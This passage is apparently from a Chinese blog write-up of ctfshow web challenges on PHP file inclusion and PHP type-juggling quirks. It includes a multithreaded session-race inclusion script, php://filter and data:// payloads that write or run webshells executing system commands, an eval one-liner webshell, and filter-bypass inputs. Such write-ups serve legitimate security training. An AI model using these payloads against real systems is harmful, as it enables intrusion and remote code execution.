&#x27;PHPSESSID&#x27;:sessionid</span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">                &#x27;file&#x27;:(&#x27;ctfshow.jpg&#x27;,fileBytes)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">def read(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessionid,data=data,</span><br><span class="line">                                cookies=&#123;</span><br><span class="line">                                    &#x27;PHPSESSID&#x27;:sessionid</span><br><span class="line">                                &#125;</span><br><span class="line">                                )</span><br><span class="line">        response2=session.get(url+&#x27;1.php&#x27;)</span><br><span class="line">        if response2.status_code==200:</span><br><span class="line">            print(&#x27;++++++++++++done++++++++++++&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(response2.status_code)</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    evnet=threading.Event()</span><br><span class="line">    with requests.session() as session:</span><br><span class="line">        for i in range(5):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        for i in range(5):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    evnet.set()</span><br></pre></td></tr></table></figure>

<h3 id="web-83"><a href="#web-83" class="headerlink" title="web-83"></a>web-83</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session</span><br><span class="line"> in /var/www/html/index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"> </span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>分析：多了两个函数</p>
<p>session_unset()：<br>释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的session_id</p>
<p>session_destroy()：<br>删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留， 也不会重置会话 cookie</p>
</blockquote>
<p> 表面上，按道理来说：这两个函数都已经将有关session的东西都删除了，我们是无法进行session文件包含的。但是：我们的脚本或者bp仍然能够进行包含。原因在于多线程竞争的含义</p>
<blockquote>
<p>什么是多线程竞争</p>
<p>线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:</p>
<p>数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。</p>
<p>这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。</p>
<p>怎么解决多线程竞争问题?—锁</p>
<p>锁的好处: 确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资 源竞争下的原子操作问题。</p>
<p>锁的坏处: 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下 降了</p>
<p>锁的致命问题: 死锁</p>
</blockquote>
<h3 id="web-84"><a href="#web-84" class="headerlink" title="web-84"></a>web-84</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf /tmp/*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>system 这句话会删除&#x2F;tem&#x2F;下面的所有文件，且不能恢复</p>
<p>-f：强制删除文件或目录；<br>-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；</p>
<p>还是web82的方法、同样的道理：多线程竞争理解 </p>
</blockquote>
<h3 id="web-85"><a href="#web-85" class="headerlink" title="web-85*"></a>web-85*</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>file_exists — 检查文件或目录是否存在,如果由指定的文件或目录存在则返回 true，否则返回 false。</p>
<p>file_get_contents — 将整个文件读入一个字符串,函数返回读取到的数据， 或者在失败时返回 false。</p>
<p>strpos — 查找字符串首次出现的位置,返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 false。</p>
</blockquote>
<p>还是web82的方法、同样的道理：多线程竞争理解</p>
<p>原因是：</p>
<p>session.upload_progress.cleanup &#x3D; on（默认开启）</p>
<p>cleanup&#x3D;on表示当文件上传结束后，php将会立即清空对应session文件中的内容</p>
<p>我们在设置session文件后，被删除了，但是一个线程刚好进行if判断，文件存在，且文件内容为空，那么就会准备执行include，同时另一个线程刚好设置了完整的session文件，那么就会被包含进去。</p>
<h3 id="web-86"><a href="#web-86" class="headerlink" title="web-86"></a>web-86</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">define(&#x27;还要秀？&#x27;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>define — 定义一个常量</p>
<p>dirname：返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（’.’），表示当前目录。否则返回的是把 path 中结尾的&#x2F;component（最后一个斜线以及后面部分）去掉之后的字符串。</p>
<p>set_include_path — 设置include函数中 include_path 配置选项，成功时返回旧的 include_path或者在失败时返回 false。</p>
<p>include</p>
<p>被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；这一点和require 不同，后者会发出一个致命错误。</p>
<p>如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix&#x2F;Linux 下以 &#x2F; 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path都会被完全忽略。例如一个文件以 ..&#x2F; 开头，则解析器会在当前目录的父目录下寻找该文件。</p>
</blockquote>
<p>还是web82的方法、同样的道理：多线程竞争理解</p>
<p> 因为设置了目录&#x2F;tmp&#x2F;sess_flag，所以set_include_path对我们的脚本没有用。</p>
<h3 id="web-87"><a href="#web-87" class="headerlink" title="web-87*"></a>web-87*</h3><p>php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;daigua.php来绕过die，当<?php die('大佬别秀了');?>被过滤时，只剩下phpdie，但是base64解码是4个一组，只需要前面加上两个字符凑足8位即可。、</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b1d4b79d-b63f-4498-9652-ece261600b6c.challenge.ctf.show/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%34%25%36%31%25%36%39%25%36%37%25%37%35%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=xxPD9waHAgc3lzdGVtKCJ0YWMgZioucGhwIik7Pz4=</span><br></pre></td></tr></table></figure>

<p>然后访问daigua.php就行了。</p>
<p>利用rot13编码</p>
<p>条件：在PHP不开启short_open_tag（短标签）时</p>
<p><em><strong>不管哪里都能看到p神的文章。</strong></em></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
<p>php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;3.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&lt;?cuc riny($_CBFG[1]);?&gt;              //rot13偏移之后的</span><br></pre></td></tr></table></figure>

<h3 id="web-88"><a href="#web-88" class="headerlink" title="web-88"></a>web-88</h3><p>发现过滤的还是比较多，但是没有过滤 : 那我们就可以使用PHP伪协议就是 这里使用的是 data:&#x2F;&#x2F;text&#x2F;plain;base64,poc 其实和79差不多 <em><strong>只是注意的是编码成base64的时候要去掉 ＝</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg</span><br></pre></td></tr></table></figure>

<h3 id="web-116"><a href="#web-116" class="headerlink" title="web-116"></a>web-116</h3><p>一道misc加简单的文件包含</p>
<p>方法：下载视频，用binwalk打开（或者010editor），foremost分离，发现图片，提取源码，传参?file&#x3D;flag.php，再下载视频用winhex打开即可（或者传参后用bp抓包）</p>
<h3 id="web-117"><a href="#web-117" class="headerlink" title="web-117"></a>web-117</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">php支持的字符编码</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p>
<p>换个编码绕过exit而已。</p>
<p>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php</p>
<p>contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?</p>
<p>1&#x3D;system(‘cat f*.php’);</p>
<h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="web-89"><a href="#web-89" class="headerlink" title="web-89"></a>web-89</h3><p>preg_match函数是用于完成字符串的正则匹配的函数，如果找到一个匹配的，就返回1，否则就返回0。</p>
<p><em><strong>preg_match只能处理字符串，如果传入的值是数组的话，就会报错，从而返回false，绕过了正则匹配。</strong></em></p>
<p> int intval ( mixed var , int [base] )第二个参数只有变量是字符串的时候才有用，var 可以是任何标量类型。</p>
<p>&#x2F;?num[]&#x3D;1</p>
<h3 id="web-90"><a href="#web-90" class="headerlink" title="web-90"></a>web-90</h3><p>intval($num,0)&#x3D;&#x3D;&#x3D;4476</p>
<p>对于intval函数，当我们输入的num的值为123a的时候，经过intval函数的转化，就变成了123</p>
<p>&#x2F;?num&#x3D;4476a</p>
<h3 id="web-91"><a href="#web-91" class="headerlink" title="web-91"></a>web-91</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;                  //m为多行匹配</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求：多行匹配php结尾，单行匹配不到php</p>
<p>那意思就是换行呗：&#x2F;?cmd&#x3D;%0aphp</p>
<h3 id="web-92"><a href="#web-92" class="headerlink" title="web-92"></a>web-92</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求：数值不能为4476，转为整数时要是4476</p>
<p>八或者十六进制绕过：&#x2F;?num&#x3D;0x117c</p>
<h3 id="web-93"><a href="#web-93" class="headerlink" title="web-93"></a>web-93</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求：数值不为4476，不能包含字母，整型等于4476</p>
<p>八进制绕过：&#x2F;?num&#x3D;010574</p>
<h3 id="web-94"><a href="#web-94" class="headerlink" title="web-94"></a>web-94</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;                //有0但是不是第一位</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em><strong>strpos() 函数返回字符串在另一个字符串中第一次出现的位置。</strong></em></p>
<p>如果没有找到该字符串，则返回 false。</p>
<table>
<thead>
<tr>
<th>string</th>
<th>必需。规定被搜索的字符串。</th>
</tr>
</thead>
<tbody><tr>
<td>find</td>
<td>必需。规定要查找的字符。</td>
</tr>
<tr>
<td>start</td>
<td>可选。规定开始搜索的位置。</td>
</tr>
</tbody></table>
<p>要求：数值不为4476，不能包含字母，不能为八进制，整形等于4476</p>
<p>我们可以使用小数，反正会被强转：&#x2F;?num&#x3D;4476.0</p>
<h3 id="web-95"><a href="#web-95" class="headerlink" title="web-95"></a>web-95</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求：在上面的基础上，不能有点。</p>
<p><em><strong>可以使用换行或者空格或者+号，再加上八进制来绕过。</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?num= 010574            //注意有空格</span><br><span class="line">/?num=%20010574</span><br><span class="line">/?num=%0a010574</span><br><span class="line">/?num=+010574</span><br><span class="line">/?num=%09010574</span><br><span class="line">/?num=%2b010574</span><br></pre></td></tr></table></figure>

<h3 id="web-96"><a href="#web-96" class="headerlink" title="web-96"></a>web-96</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class="line">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;?u&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>&#x2F;?u&#x3D;.&#x2F;flag.php</p>
<p>&#x2F;?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-97"><a href="#web-97" class="headerlink" title="web-97"></a>web-97</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">echo $flag;</span><br><span class="line">else</span><br><span class="line">print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>a与b的md5值 相同，我们直接去找找md5相同的就行。还有一种就是让俩md5都为空。<em><strong>传入数组，由于md5函数是无法处理函数的</strong></em>，所以当我们传入的值是数组的时候，会返回NULL，经过md5加密，得到了NULL，在经过强类型的判断，返回了TRUE。</p>
<p>a[]&#x3D;1&amp;b[]&#x3D;2</p>
<h3 id="web-98"><a href="#web-98" class="headerlink" title="web-98"></a>web-98</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;：了解引用的概念，比较简单。</p>
<p>&#x2F;?yake&#x3D;daigua</p>
<p>HTTP_FLAG&#x3D;flag</p>
<h3 id="web-99"><a href="#web-99" class="headerlink" title="web-99"></a>web-99</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$allow = array();</span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>由于每次rand都是从1开始的，因此array数组中存在1的概率是非常大的，之后in_array($_GET[‘n’],$array)，当传入的参数n的值为1.php时，假设array中压入了1。由于省略了第三个参数，存在弱类型比较，所以说1.php在比较的时候会强制转换为1，刚好array中存在着1.满足if条件，执行file_put_contents。</p>
<p>&#x2F;?n&#x3D;1.php</p>
<p>content&#x3D;<?php eval($_POST[1]);?></p>
<p>1&#x3D;system(‘tac flag36d.php’);</p>
<h3 id="web-100"><a href="#web-100" class="headerlink" title="web-100"></a>web-100</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;</span><br><span class="line">$ctfshow = new ctfshow();</span><br><span class="line">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v0)&#123;</span><br><span class="line">    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;</span><br><span class="line">            